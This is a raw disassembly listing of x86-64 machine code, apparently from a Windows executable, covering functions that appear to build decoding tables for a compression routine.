   140003976:	48 c7 c0 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rax
   14000397d:	eb 22                	jmp    0x1400039a1
   14000397f:	48 2b d8             	sub    %rax,%rbx
   140003982:	4c 8d 04 38          	lea    (%rax,%rdi,1),%r8
   140003986:	8b 44 24 78          	mov    0x78(%rsp),%eax
   14000398a:	4c 8b cb             	mov    %rbx,%r9
   14000398d:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003991:	48 8b d5             	mov    %rbp,%rdx
   140003994:	49 8b ce             	mov    %r14,%rcx
   140003997:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000399c:	e8 af f4 ff ff       	call   0x140002e50
   1400039a1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400039a6:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400039ab:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400039b0:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400039b5:	48 83 c4 30          	add    $0x30,%rsp
   1400039b9:	41 5e                	pop    %r14
   1400039bb:	c3                   	ret
   1400039bc:	cc                   	int3
   1400039bd:	cc                   	int3
   1400039be:	cc                   	int3
   1400039bf:	cc                   	int3
   1400039c0:	40 57                	rex push %rdi
   1400039c2:	41 55                	push   %r13
   1400039c4:	48 81 ec f8 00 00 00 	sub    $0xf8,%rsp
   1400039cb:	48 8b 05 2e d6 02 00 	mov    0x2d62e(%rip),%rax        # 0x140031000
   1400039d2:	48 33 c4             	xor    %rsp,%rax
   1400039d5:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   1400039dc:	00 
   1400039dd:	48 8b 84 24 30 01 00 	mov    0x130(%rsp),%rax
   1400039e4:	00 
   1400039e5:	4d 8b d8             	mov    %r8,%r11
   1400039e8:	44 8b ac 24 48 01 00 	mov    0x148(%rsp),%r13d
   1400039ef:	00 
   1400039f0:	45 8b d5             	mov    %r13d,%r10d
   1400039f3:	41 8b f9             	mov    %r9d,%edi
   1400039f6:	44 2b d2             	sub    %edx,%r10d
   1400039f9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400039fe:	4c 8b c9             	mov    %rcx,%r9
   140003a01:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   140003a08:	00 
   140003a09:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
   140003a0e:	45 8b c5             	mov    %r13d,%r8d
   140003a11:	44 2b 84 24 40 01 00 	sub    0x140(%rsp),%r8d
   140003a18:	00 
   140003a19:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003a1e:	89 7c 24 0c          	mov    %edi,0xc(%rsp)
   140003a22:	89 54 24 08          	mov    %edx,0x8(%rsp)
   140003a26:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140003a2b:	44 89 54 24 1c       	mov    %r10d,0x1c(%rsp)
   140003a30:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140003a35:	0f 10 00             	movups (%rax),%xmm0
   140003a38:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003a3c:	0f 11 84 24 88 00 00 	movups %xmm0,0x88(%rsp)
   140003a43:	00 
   140003a44:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140003a48:	8b 40 30             	mov    0x30(%rax),%eax
   140003a4b:	89 84 24 b8 00 00 00 	mov    %eax,0xb8(%rsp)
   140003a52:	0f 11 84 24 a8 00 00 	movups %xmm0,0xa8(%rsp)
   140003a59:	00 
   140003a5a:	0f 11 8c 24 98 00 00 	movups %xmm1,0x98(%rsp)
   140003a61:	00 
   140003a62:	85 ff                	test   %edi,%edi
   140003a64:	0f 84 2c 02 00 00    	je     0x140003c96
   140003a6a:	48 89 9c 24 28 01 00 	mov    %rbx,0x128(%rsp)
   140003a71:	00 
   140003a72:	48 89 ac 24 f0 00 00 	mov    %rbp,0xf0(%rsp)
   140003a79:	00 
   140003a7a:	48 89 b4 24 e8 00 00 	mov    %rsi,0xe8(%rsp)
   140003a81:	00 
   140003a82:	8b f7                	mov    %edi,%esi
   140003a84:	4c 89 a4 24 e0 00 00 	mov    %r12,0xe0(%rsp)
   140003a8b:	00 
   140003a8c:	4d 8b e3             	mov    %r11,%r12
   140003a8f:	4c 89 b4 24 d8 00 00 	mov    %r14,0xd8(%rsp)
   140003a96:	00 
   140003a97:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003a9c:	bf 01 00 00 00       	mov    $0x1,%edi
   140003aa1:	4c 89 bc 24 d0 00 00 	mov    %r15,0xd0(%rsp)
   140003aa8:	00 
   140003aa9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003ab0:	41 0f b6 44 24 01    	movzbl 0x1(%r12),%eax
   140003ab6:	4c 8d 9c 24 88 00 00 	lea    0x88(%rsp),%r11
   140003abd:	00 
   140003abe:	45 8b 3c 83          	mov    (%r11,%rax,4),%r15d
   140003ac2:	4d 8d 1c 83          	lea    (%r11,%rax,4),%r11
   140003ac6:	41 0f b6 2c 24       	movzbl (%r12),%ebp
   140003acb:	41 8b dd             	mov    %r13d,%ebx
   140003ace:	2b d8                	sub    %eax,%ebx
   140003ad0:	44 89 7c 24 14       	mov    %r15d,0x14(%rsp)
   140003ad5:	8b ca                	mov    %edx,%ecx
   140003ad7:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   140003adc:	2b cb                	sub    %ebx,%ecx
   140003ade:	44 8b f7             	mov    %edi,%r14d
   140003ae1:	41 d3 e6             	shl    %cl,%r14d
   140003ae4:	44 89 74 24 10       	mov    %r14d,0x10(%rsp)
   140003ae9:	41 3b c8             	cmp    %r8d,%ecx
   140003aec:	0f 82 31 01 00 00    	jb     0x140003c23
   140003af2:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140003af7:	42 8d 14 13          	lea    (%rbx,%r10,1),%edx
   140003afb:	83 fa 01             	cmp    $0x1,%edx
   140003afe:	4f 8d 0c b9          	lea    (%r9,%r15,4),%r9
   140003b02:	0f 4c d7             	cmovl  %edi,%edx
   140003b05:	48 8d 3c 95 00 00 00 	lea    0x0(,%rdx,4),%rdi
   140003b0c:	00 
   140003b0d:	44 8b 04 07          	mov    (%rdi,%rax,1),%r8d
   140003b11:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140003b16:	4e 8d 14 40          	lea    (%rax,%r8,2),%r10
   140003b1a:	8b c3                	mov    %ebx,%eax
   140003b1c:	48 6b c8 34          	imul   $0x34,%rax,%rcx
   140003b20:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140003b25:	0f 10 04 01          	movups (%rcx,%rax,1),%xmm0
   140003b29:	0f 10 4c 01 10       	movups 0x10(%rcx,%rax,1),%xmm1
   140003b2e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140003b33:	0f 10 44 01 20       	movups 0x20(%rcx,%rax,1),%xmm0
   140003b38:	8b 44 01 30          	mov    0x30(%rcx,%rax,1),%eax
   140003b3c:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140003b43:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   140003b48:	0f 11 4c 24 60       	movups %xmm1,0x60(%rsp)
   140003b4d:	83 fa 01             	cmp    $0x1,%edx
   140003b50:	76 1f                	jbe    0x140003b71
   140003b52:	8b 44 3c 50          	mov    0x50(%rsp,%rdi,1),%eax
   140003b56:	66 89 2c 24          	mov    %bp,(%rsp)
   140003b5a:	88 5c 24 02          	mov    %bl,0x2(%rsp)
   140003b5e:	c6 44 24 03 01       	movb   $0x1,0x3(%rsp)
   140003b63:	85 c0                	test   %eax,%eax
   140003b65:	74 0a                	je     0x140003b71
   140003b67:	8b c8                	mov    %eax,%ecx
   140003b69:	49 8b f9             	mov    %r9,%rdi
   140003b6c:	8b 04 24             	mov    (%rsp),%eax
   140003b6f:	f3 ab                	rep stos %eax,(%rdi)
   140003b71:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003b75:	41 2b c0             	sub    %r8d,%eax
   140003b78:	0f 84 90 00 00 00    	je     0x140003c0e
   140003b7e:	44 8b 7c 24 08       	mov    0x8(%rsp),%r15d
   140003b83:	41 be 00 01 00 00    	mov    $0x100,%r14d
   140003b89:	c6 44 24 03 02       	movb   $0x2,0x3(%rsp)
   140003b8e:	44 8b d8             	mov    %eax,%r11d
   140003b91:	41 0f b6 42 01       	movzbl 0x1(%r10),%eax
   140003b96:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   140003b9b:	8b 14 86             	mov    (%rsi,%rax,4),%edx
   140003b9e:	48 8d 34 86          	lea    (%rsi,%rax,4),%rsi
   140003ba2:	41 8b fd             	mov    %r13d,%edi
   140003ba5:	41 8b cf             	mov    %r15d,%ecx
   140003ba8:	2b f8                	sub    %eax,%edi
   140003baa:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003bb0:	41 0f b6 02          	movzbl (%r10),%eax
   140003bb4:	2b cf                	sub    %edi,%ecx
   140003bb6:	41 0f af c6          	imul   %r14d,%eax
   140003bba:	2b cb                	sub    %ebx,%ecx
   140003bbc:	41 d3 e0             	shl    %cl,%r8d
   140003bbf:	44 03 c2             	add    %edx,%r8d
   140003bc2:	66 03 c5             	add    %bp,%ax
   140003bc5:	40 02 fb             	add    %bl,%dil
   140003bc8:	66 89 04 24          	mov    %ax,(%rsp)
   140003bcc:	40 88 7c 24 02       	mov    %dil,0x2(%rsp)
   140003bd1:	8b 04 24             	mov    (%rsp),%eax
   140003bd4:	0f 1f 40 00          	nopl   0x0(%rax)
   140003bd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003bdf:	00 
   140003be0:	8b ca                	mov    %edx,%ecx
   140003be2:	ff c2                	inc    %edx
   140003be4:	41 89 04 89          	mov    %eax,(%r9,%rcx,4)
   140003be8:	41 3b d0             	cmp    %r8d,%edx
   140003beb:	72 f3                	jb     0x140003be0
   140003bed:	49 83 c2 02          	add    $0x2,%r10
   140003bf1:	44 89 06             	mov    %r8d,(%rsi)
   140003bf4:	49 83 eb 01          	sub    $0x1,%r11
   140003bf8:	75 97                	jne    0x140003b91
   140003bfa:	44 8b 74 24 10       	mov    0x10(%rsp),%r14d
   140003bff:	44 8b 7c 24 14       	mov    0x14(%rsp),%r15d
   140003c04:	4c 8b 5c 24 40       	mov    0x40(%rsp),%r11
   140003c09:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   140003c0e:	4c 8b 4c 24 48       	mov    0x48(%rsp),%r9
   140003c13:	43 8d 14 37          	lea    (%r15,%r14,1),%edx
   140003c17:	44 8b 44 24 18       	mov    0x18(%rsp),%r8d
   140003c1c:	44 8b 54 24 1c       	mov    0x1c(%rsp),%r10d
   140003c21:	eb 24                	jmp    0x140003c47
   140003c23:	43 8d 14 3e          	lea    (%r14,%r15,1),%edx
   140003c27:	66 89 6c 24 04       	mov    %bp,0x4(%rsp)
   140003c2c:	88 5c 24 06          	mov    %bl,0x6(%rsp)
   140003c30:	c6 44 24 07 01       	movb   $0x1,0x7(%rsp)
   140003c35:	44 3b fa             	cmp    %edx,%r15d
   140003c38:	73 12                	jae    0x140003c4c
   140003c3a:	8b 44 24 04          	mov    0x4(%rsp),%eax
   140003c3e:	4b 8d 3c b9          	lea    (%r9,%r15,4),%rdi
   140003c42:	41 8b ce             	mov    %r14d,%ecx
   140003c45:	f3 ab                	rep stos %eax,(%rdi)
   140003c47:	bf 01 00 00 00       	mov    $0x1,%edi
   140003c4c:	49 83 c4 02          	add    $0x2,%r12
   140003c50:	41 89 13             	mov    %edx,(%r11)
   140003c53:	8b 54 24 08          	mov    0x8(%rsp),%edx
   140003c57:	48 83 ee 01          	sub    $0x1,%rsi
   140003c5b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003c60:	0f 85 4a fe ff ff    	jne    0x140003ab0
   140003c66:	4c 8b bc 24 d0 00 00 	mov    0xd0(%rsp),%r15
   140003c6d:	00 
   140003c6e:	4c 8b b4 24 d8 00 00 	mov    0xd8(%rsp),%r14
   140003c75:	00 
   140003c76:	4c 8b a4 24 e0 00 00 	mov    0xe0(%rsp),%r12
   140003c7d:	00 
   140003c7e:	48 8b b4 24 e8 00 00 	mov    0xe8(%rsp),%rsi
   140003c85:	00 
   140003c86:	48 8b ac 24 f0 00 00 	mov    0xf0(%rsp),%rbp
   140003c8d:	00 
   140003c8e:	48 8b 9c 24 28 01 00 	mov    0x128(%rsp),%rbx
   140003c95:	00 
   140003c96:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140003c9d:	00 
   140003c9e:	48 33 cc             	xor    %rsp,%rcx
   140003ca1:	e8 1a 89 00 00       	call   0x14000c5c0
   140003ca6:	48 81 c4 f8 00 00 00 	add    $0xf8,%rsp
   140003cad:	41 5d                	pop    %r13
   140003caf:	5f                   	pop    %rdi
   140003cb0:	c3                   	ret
   140003cb1:	cc                   	int3
   140003cb2:	cc                   	int3
   140003cb3:	cc                   	int3
   140003cb4:	cc                   	int3
   140003cb5:	cc                   	int3
   140003cb6:	cc                   	int3
   140003cb7:	cc                   	int3
   140003cb8:	cc                   	int3
   140003cb9:	cc                   	int3
   140003cba:	cc                   	int3
   140003cbb:	cc                   	int3
   140003cbc:	cc                   	int3
   140003cbd:	cc                   	int3
   140003cbe:	cc                   	int3
   140003cbf:	cc                   	int3
   140003cc0:	40 53                	rex push %rbx
   140003cc2:	56                   	push   %rsi
   140003cc3:	57                   	push   %rdi
   140003cc4:	41 55                	push   %r13
   140003cc6:	41 56                	push   %r14
   140003cc8:	41 57                	push   %r15
   140003cca:	48 81 ec 08 02 00 00 	sub    $0x208,%rsp
   140003cd1:	48 8b 05 28 d3 02 00 	mov    0x2d328(%rip),%rax        # 0x140031000
   140003cd8:	48 33 c4             	xor    %rsp,%rax
   140003cdb:	48 89 84 24 f0 01 00 	mov    %rax,0x1f0(%rsp)
   140003ce2:	00 
   140003ce3:	8b 19                	mov    (%rcx),%ebx
   140003ce5:	49 8d b1 70 02 00 00 	lea    0x270(%r9),%rsi
   140003cec:	48 8b c1             	mov    %rcx,%rax
   140003cef:	0f b6 fb             	movzbl %bl,%edi
   140003cf2:	48 83 c0 04          	add    $0x4,%rax
   140003cf6:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   140003cfb:	48 81 bc 24 60 02 00 	cmpq   $0x5dc,0x260(%rsp)
   140003d02:	00 dc 05 00 00 
   140003d07:	4d 8d b9 dc 04 00 00 	lea    0x4dc(%r9),%r15
   140003d0e:	4d 8b f1             	mov    %r9,%r14
   140003d11:	89 5c 24 54          	mov    %ebx,0x54(%rsp)
   140003d15:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   140003d19:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003d1e:	0f 82 d6 02 00 00    	jb     0x140003ffa
   140003d24:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003d27:	33 c0                	xor    %eax,%eax
   140003d29:	0f 11 06             	movups %xmm0,(%rsi)
   140003d2c:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   140003d30:	0f 11 46 20          	movups %xmm0,0x20(%rsi)
   140003d34:	0f 11 46 30          	movups %xmm0,0x30(%rsi)
   140003d38:	0f 11 46 40          	movups %xmm0,0x40(%rsi)
   140003d3c:	0f 11 46 50          	movups %xmm0,0x50(%rsi)
   140003d40:	48 89 46 60          	mov    %rax,0x60(%rsi)
   140003d44:	89 46 68             	mov    %eax,0x68(%rsi)
   140003d47:	83 ff 0c             	cmp    $0xc,%edi
   140003d4a:	0f 87 aa 02 00 00    	ja     0x140003ffa
   140003d50:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   140003d57:	00 
   140003d58:	49 8b cf             	mov    %r15,%rcx
   140003d5b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003d60:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
   140003d65:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
   140003d6a:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140003d6f:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140003d74:	4c 8b c6             	mov    %rsi,%r8
   140003d77:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003d7c:	e8 2f e8 ff ff       	call   0x1400025b0
   140003d81:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003d86:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140003d8a:	0f 87 71 02 00 00    	ja     0x140004001
   140003d90:	44 8b 6c 24 58       	mov    0x58(%rsp),%r13d
   140003d95:	44 3b ef             	cmp    %edi,%r13d
   140003d98:	0f 87 5c 02 00 00    	ja     0x140003ffa
   140003d9e:	42 83 3c ae 00       	cmpl   $0x0,(%rsi,%r13,4)
   140003da3:	41 8b fd             	mov    %r13d,%edi
   140003da6:	48 89 ac 24 50 02 00 	mov    %rbp,0x250(%rsp)
   140003dad:	00 
   140003dae:	4c 89 a4 24 00 02 00 	mov    %r12,0x200(%rsp)
   140003db5:	00 
   140003db6:	75 08                	jne    0x140003dc0
   140003db8:	ff cf                	dec    %edi
   140003dba:	83 3c be 00          	cmpl   $0x0,(%rsi,%rdi,4)
   140003dbe:	74 f8                	je     0x140003db8
   140003dc0:	45 33 d2             	xor    %r10d,%r10d
   140003dc3:	8d 6f 01             	lea    0x1(%rdi),%ebp
   140003dc6:	4d 8d 9e a4 02 00 00 	lea    0x2a4(%r14),%r11
   140003dcd:	45 8b e2             	mov    %r10d,%r12d
   140003dd0:	83 fd 01             	cmp    $0x1,%ebp
   140003dd3:	76 1e                	jbe    0x140003df3
   140003dd5:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140003dd9:	8b d7                	mov    %edi,%edx
   140003ddb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003de0:	41 8b c4             	mov    %r12d,%eax
   140003de3:	44 03 61 c8          	add    -0x38(%rcx),%r12d
   140003de7:	89 01                	mov    %eax,(%rcx)
   140003de9:	48 8d 49 04          	lea    0x4(%rcx),%rcx
   140003ded:	48 83 ea 01          	sub    $0x1,%rdx
   140003df1:	75 ed                	jne    0x140003de0
   140003df3:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140003df8:	45 8b c2             	mov    %r10d,%r8d
   140003dfb:	45 89 63 04          	mov    %r12d,0x4(%r11)
   140003dff:	45 85 c9             	test   %r9d,%r9d
   140003e02:	74 3e                	je     0x140003e42
   140003e04:	0f 1f 40 00          	nopl   0x0(%rax)
   140003e08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003e0f:	00 
   140003e10:	41 0f b6 17          	movzbl (%r15),%edx
   140003e14:	4d 8d 7f 01          	lea    0x1(%r15),%r15
   140003e18:	41 8b 4c 93 04       	mov    0x4(%r11,%rdx,4),%ecx
   140003e1d:	8d 41 01             	lea    0x1(%rcx),%eax
   140003e20:	41 89 44 93 04       	mov    %eax,0x4(%r11,%rdx,4)
   140003e25:	45 88 84 4e dc 02 00 	mov    %r8b,0x2dc(%r14,%rcx,2)
   140003e2c:	00 
   140003e2d:	41 ff c0             	inc    %r8d
   140003e30:	41 88 94 4e dd 02 00 	mov    %dl,0x2dd(%r14,%rcx,2)
   140003e37:	00 
   140003e38:	45 3b c1             	cmp    %r9d,%r8d
   140003e3b:	72 d3                	jb     0x140003e10
   140003e3d:	44 8b 6c 24 58       	mov    0x58(%rsp),%r13d
   140003e42:	8b 74 24 50          	mov    0x50(%rsp),%esi
   140003e46:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003e4c:	45 89 53 04          	mov    %r10d,0x4(%r11)
   140003e50:	41 3b e9             	cmp    %r9d,%ebp
   140003e53:	76 31                	jbe    0x140003e86
   140003e55:	44 8b de             	mov    %esi,%r11d
   140003e58:	4d 8d 46 04          	lea    0x4(%r14),%r8
   140003e5c:	45 2b dd             	sub    %r13d,%r11d
   140003e5f:	90                   	nop
   140003e60:	41 8b 80 70 02 00 00 	mov    0x270(%r8),%eax
   140003e67:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   140003e6b:	41 03 cb             	add    %r11d,%ecx
   140003e6e:	4d 8d 40 04          	lea    0x4(%r8),%r8
   140003e72:	d3 e0                	shl    %cl,%eax
   140003e74:	41 8b d2             	mov    %r10d,%edx
   140003e77:	44 03 d0             	add    %eax,%r10d
   140003e7a:	41 89 50 fc          	mov    %edx,-0x4(%r8)
   140003e7e:	41 ff c1             	inc    %r9d
   140003e81:	44 3b cd             	cmp    %ebp,%r9d
   140003e84:	72 da                	jb     0x140003e60
   140003e86:	45 8b d5             	mov    %r13d,%r10d
   140003e89:	44 8b fe             	mov    %esi,%r15d
   140003e8c:	44 2b d7             	sub    %edi,%r10d
   140003e8f:	41 ff c2             	inc    %r10d
   140003e92:	45 2b fa             	sub    %r10d,%r15d
   140003e95:	41 ff c7             	inc    %r15d
   140003e98:	45 3b d7             	cmp    %r15d,%r10d
   140003e9b:	0f 83 f8 00 00 00    	jae    0x140003f99
   140003ea1:	41 8b c2             	mov    %r10d,%eax
   140003ea4:	4c 6b d8 34          	imul   $0x34,%rax,%r11
   140003ea8:	4d 03 de             	add    %r14,%r11
   140003eab:	48 6b f0 cc          	imul   $0xffffffffffffffcc,%rax,%rsi
   140003eaf:	90                   	nop
   140003eb0:	ba 01 00 00 00       	mov    $0x1,%edx
   140003eb5:	66 41 0f 6e ca       	movd   %r10d,%xmm1
   140003eba:	3b ea                	cmp    %edx,%ebp
   140003ebc:	0f 86 c3 00 00 00    	jbe    0x140003f85
   140003ec2:	83 ff 10             	cmp    $0x10,%edi
   140003ec5:	0f 82 92 00 00 00    	jb     0x140003f5d
   140003ecb:	8b c7                	mov    %edi,%eax
   140003ecd:	4d 8d 4e 04          	lea    0x4(%r14),%r9
   140003ed1:	49 8d 0c 86          	lea    (%r14,%rax,4),%rcx
   140003ed5:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   140003ed9:	49 8d 43 04          	lea    0x4(%r11),%rax
   140003edd:	48 3b c1             	cmp    %rcx,%rax
   140003ee0:	77 05                	ja     0x140003ee7
   140003ee2:	4d 3b c1             	cmp    %r9,%r8
   140003ee5:	73 76                	jae    0x140003f5d
   140003ee7:	8b c7                	mov    %edi,%eax
   140003ee9:	44 8b c5             	mov    %ebp,%r8d
   140003eec:	83 e0 0f             	and    $0xf,%eax
   140003eef:	44 2b c0             	sub    %eax,%r8d
   140003ef2:	41 b9 09 00 00 00    	mov    $0x9,%r9d
   140003ef8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003eff:	00 
   140003f00:	8b c2                	mov    %edx,%eax
   140003f02:	83 c2 10             	add    $0x10,%edx
   140003f05:	f3 41 0f 6f 04 86    	movdqu (%r14,%rax,4),%xmm0
   140003f0b:	66 0f d2 c1          	psrld  %xmm1,%xmm0
   140003f0f:	f3 41 0f 7f 04 83    	movdqu %xmm0,(%r11,%rax,4)
   140003f15:	41 8d 41 fc          	lea    -0x4(%r9),%eax
   140003f19:	f3 41 0f 6f 04 86    	movdqu (%r14,%rax,4),%xmm0
   140003f1f:	66 0f d2 c1          	psrld  %xmm1,%xmm0
   140003f23:	f3 41 0f 7f 04 83    	movdqu %xmm0,(%r11,%rax,4)
   140003f29:	41 8b c1             	mov    %r9d,%eax
   140003f2c:	f3 41 0f 6f 04 86    	movdqu (%r14,%rax,4),%xmm0
   140003f32:	66 0f d2 c1          	psrld  %xmm1,%xmm0
   140003f36:	f3 41 0f 7f 04 83    	movdqu %xmm0,(%r11,%rax,4)
   140003f3c:	41 8d 41 04          	lea    0x4(%r9),%eax
   140003f40:	41 83 c1 10          	add    $0x10,%r9d
   140003f44:	f3 41 0f 6f 04 86    	movdqu (%r14,%rax,4),%xmm0
   140003f4a:	66 0f d2 c1          	psrld  %xmm1,%xmm0
   140003f4e:	f3 41 0f 7f 04 83    	movdqu %xmm0,(%r11,%rax,4)
   140003f54:	41 3b d0             	cmp    %r8d,%edx
   140003f57:	72 a7                	jb     0x140003f00
   140003f59:	3b d5                	cmp    %ebp,%edx
   140003f5b:	73 28                	jae    0x140003f85
   140003f5d:	8b c2                	mov    %edx,%eax
   140003f5f:	44 8b c5             	mov    %ebp,%r8d
   140003f62:	44 2b c2             	sub    %edx,%r8d
   140003f65:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   140003f69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003f70:	8b 14 06             	mov    (%rsi,%rax,1),%edx
   140003f73:	48 8d 40 04          	lea    0x4(%rax),%rax
   140003f77:	41 8b ca             	mov    %r10d,%ecx
   140003f7a:	d3 ea                	shr    %cl,%edx
   140003f7c:	89 50 fc             	mov    %edx,-0x4(%rax)
   140003f7f:	49 83 e8 01          	sub    $0x1,%r8
   140003f83:	75 eb                	jne    0x140003f70
   140003f85:	41 ff c2             	inc    %r10d
   140003f88:	49 83 c3 34          	add    $0x34,%r11
   140003f8c:	48 83 ee 34          	sub    $0x34,%rsi
   140003f90:	45 3b d7             	cmp    %r15d,%r10d
   140003f93:	0f 82 17 ff ff ff    	jb     0x140003eb0
   140003f99:	8b 54 24 50          	mov    0x50(%rsp),%edx
   140003f9d:	45 8d 55 01          	lea    0x1(%r13),%r10d
   140003fa1:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003fa6:	49 8d 86 a4 02 00 00 	lea    0x2a4(%r14),%rax
   140003fad:	44 89 54 24 38       	mov    %r10d,0x38(%rsp)
   140003fb2:	4d 8d 86 dc 02 00 00 	lea    0x2dc(%r14),%r8
   140003fb9:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   140003fbd:	45 8b cc             	mov    %r12d,%r9d
   140003fc0:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140003fc5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003fca:	e8 f1 f9 ff ff       	call   0x1400039c0
   140003fcf:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140003fd4:	4c 8b a4 24 00 02 00 	mov    0x200(%rsp),%r12
   140003fdb:	00 
   140003fdc:	48 8b ac 24 50 02 00 	mov    0x250(%rsp),%rbp
   140003fe3:	00 
   140003fe4:	88 5c 24 56          	mov    %bl,0x56(%rsp)
   140003fe8:	c6 44 24 55 01       	movb   $0x1,0x55(%rsp)
   140003fed:	8b 4c 24 54          	mov    0x54(%rsp),%ecx
   140003ff1:	89 08                	mov    %ecx,(%rax)
   140003ff3:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003ff8:	eb 07                	jmp    0x140004001
   140003ffa:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   140004001:	48 8b 8c 24 f0 01 00 	mov    0x1f0(%rsp),%rcx
   140004008:	00 
   140004009:	48 33 cc             	xor    %rsp,%rcx
   14000400c:	e8 af 85 00 00       	call   0x14000c5c0
   140004011:	48 81 c4 08 02 00 00 	add    $0x208,%rsp
   140004018:	41 5f                	pop    %r15
   14000401a:	41 5e                	pop    %r14
   14000401c:	41 5d                	pop    %r13
   14000401e:	5f                   	pop    %rdi
   14000401f:	5e                   	pop    %rsi
   140004020:	5b                   	pop    %rbx
   140004021:	c3                   	ret
   140004022:	cc                   	int3
   140004023:	cc                   	int3
   140004024:	cc                   	int3
   140004025:	cc                   	int3
   140004026:	cc                   	int3
   140004027:	cc                   	int3
   140004028:	cc                   	int3
   140004029:	cc                   	int3
   14000402a:	cc                   	int3
   14000402b:	cc                   	int3
   14000402c:	cc                   	int3
   14000402d:	cc                   	int3
   14000402e:	cc                   	int3
   14000402f:	cc                   	int3
   140004030:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004035:	53                   	push   %rbx
   140004036:	48 83 ec 70          	sub    $0x70,%rsp
   14000403a:	49 8b c0             	mov    %r8,%rax
   14000403d:	48 8b da             	mov    %rdx,%rbx
   140004040:	4c 8b d9             	mov    %rcx,%r11
   140004043:	48 8b d0             	mov    %rax,%rdx
   140004046:	4d 8b c1             	mov    %r9,%r8
   140004049:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000404e:	e8 dd d0 ff ff       	call   0x140001130
   140004053:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140004057:	0f 87 0d 03 00 00    	ja     0x14000436a
   14000405d:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140004064:	00 
   140004065:	49 03 db             	add    %r11,%rbx
   140004068:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   14000406d:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140004074:	00 
   140004075:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   14000407a:	48 89 b4 24 90 00 00 	mov    %rsi,0x90(%rsp)
   140004081:	00 
   140004082:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140004087:	48 89 bc 24 98 00 00 	mov    %rdi,0x98(%rsp)
   14000408e:	00 
   14000408f:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140004094:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140004099:	44 0f b6 60 02       	movzbl 0x2(%rax),%r12d
   14000409e:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   1400040a3:	4c 8d 6b f9          	lea    -0x7(%rbx),%r13
   1400040a7:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1400040ac:	4c 8d 70 04          	lea    0x4(%rax),%r14
   1400040b0:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   1400040b5:	4c 8b 7c 24 48       	mov    0x48(%rsp),%r15
